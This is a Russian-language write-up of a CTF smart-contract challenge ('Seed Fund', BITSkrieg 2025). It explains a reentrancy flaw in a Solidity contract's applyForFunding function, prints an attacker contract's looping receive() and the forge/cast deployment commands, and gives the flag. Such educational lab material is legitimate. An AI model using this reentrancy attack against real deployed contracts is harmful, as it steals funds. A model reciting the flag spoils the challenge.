# Seed Fund

Флаг: BITSCTF{Crypt0_M1lli0n4ir3_14e3fd12}

---

Категория: misc
Уровень сложности: Средний
Использованные инструменты: [foundry](https://book.getfoundry.sh/)

Суть задания: дан [смарт-контракт](https://github.com/mtchuikov/ctfs/2025/BITSkrieg/assets/AngelInvestor.sol), написанный на Solidity. Для получения флага необходимо взломать его, выведя часть средств с баланса.

Примечание: во время соревнования для каждого пользователя контракт развертывался в отдельной тестовой сети со стартовым балансом в 500 ETH. Участнику выдавался заранее сгенерированный кошелек с небольшой суммой ETH. 

---
Решение:

В предложенном для взлома контракте есть функция `isChallSolved`, которая определяет условия, при наличии которых задание считается выполненным. В данном случае нам нужно сделать так, чтобы баланс адреса, вызывающего ее, был больше чем значение переменной контракта `CHALLENGE_THRESHOLD`, равное 100 ETH. Добиться желаемого результата можно только взломав его, ведь наш стартовый баланс небольшой и нет других путей его увеличить.

Анализ кода показал наличие нескольких функций, которые способны передавать баланс от аккаунта контракта к пользователю: `applyForFunding` и `buyCompany`. Однако изучать вторую из них более детально не имеет смысла, поскольку ее вызовы ограничены модификатором `onlyInvestor`, аналогичным по функционалу с модификатором [onlyOwner](https://docs.openzeppelin.com/contracts/5.x/api/access#Ownable-onlyOwner--) , разрешающим взаимодействие с ней только, по-сути, владельцу контракт.

```
    ...
    modifier onlyInvestor() {
        require(msg.sender == investor, "Only investor can perform this");
        _;
    }

    constructor() payable {
        investor = msg.sender;
        totalFunds = address(this).balance;
    }
    ...
```

Однако первая функция, `applyForFunding`, действительно, содержит уязвимость. Как можно заметить, изменения состояния переменной `hasReceivedFunding`, обозначающей то, что средства уже переводились пользователю, происходит только после самого перевода средств.

```
    ...
    function applyForFunding(uint256 equityOffered) external {
        require(equityOffered > 0 && equityOffered <= 7, "Equity offered must be between 1% and 7%");
        // защита от многократного перевода ETH
        require(!startups[msg.sender].hasReceivedFunding, "Already funded");

        uint256 fundingAmount = equityOffered * 3 ether;
        require(fundingAmount <= 21 ether, "Cannot exceed 21 ETH funding");
        require(totalFunds >= fundingAmount, "Not enough funds available");

        // перевод средств пользователю
        (bool success,) = msg.sender.call{value: fundingAmount}("");
        require(success, "Funding transfer failed");

        totalFunds -= fundingAmount;
        startups[msg.sender].fundingAmount += fundingAmount;
        startups[msg.sender].equityOffered = equityOffered;
        // устанавливаем значение переменной, показывающее, что ETH уже переводился
        startups[msg.sender].hasReceivedFunding = true;
    }
    ...
```

Такое поведение - перевод ETH на любой аккаунт, включая принадлежащий смарт-контракту, а также изменение состояния только после перевода - явно указывает на наличие уязвимости, известной как [Reentrancy](https://docs.soliditylang.org/en/latest/security-considerations.html), которая заключается в непредусмотренном логикой программы повторном вызове функции до того, как интеракция полностью завершиться. Схематично она может быть представлена следующим образом:

![reentrancy schema](https://github.com/mtchuikov/ctfs/2025/BITSkrieg/assets/reentrancy.png)

В нашем случае атака реализуется весьма тривиально (полный код [контракта](https://github.com/mtchuikov/ctfs/2025/BITSkrieg/assets/AngelInvestorAttack.sol)):

```
    ...
    function attack() external onlyOwner {
        target.applyForFunding(7);
        // ETH поступает на аккаунт контракта, поэтому нужно вызвать эту функцию из него.
        // В противном случае удовлетворить ее условиям не получится.
        target.isChallSolved();
    }

    receive() external payable {
        // Задаем условия выхода из цикла вызовов. Если этого не сделать, то функция будет
        // вызывать бесконечно до тех пор, пока не завершится с ошибкой.
        if (address(this).balance < target.CHALLENGE_THRESHOLD()) {
            target.applyForFunding(7);
        }
    }
    ...
``` 

Остается только развернуть контракт при помощи утилиты из набора [foundry](https://book.getfoundry.sh/) `forge create --rpc-url SET_RPC_URL --private-key SET_PRIVATE_KEY --constructor-args SET_TARGET_CONTRACT --broadcast SET_PATH_TO_REENTRANCY_CONTRACT:Reentrancy ` и выполнить вызов функции `attack` для начала атаки `cast send SET_REENTRANCY_CONTRACT "attack()" --private-key SET_PRIVATE_KEY --rpc-url RPC_URL`.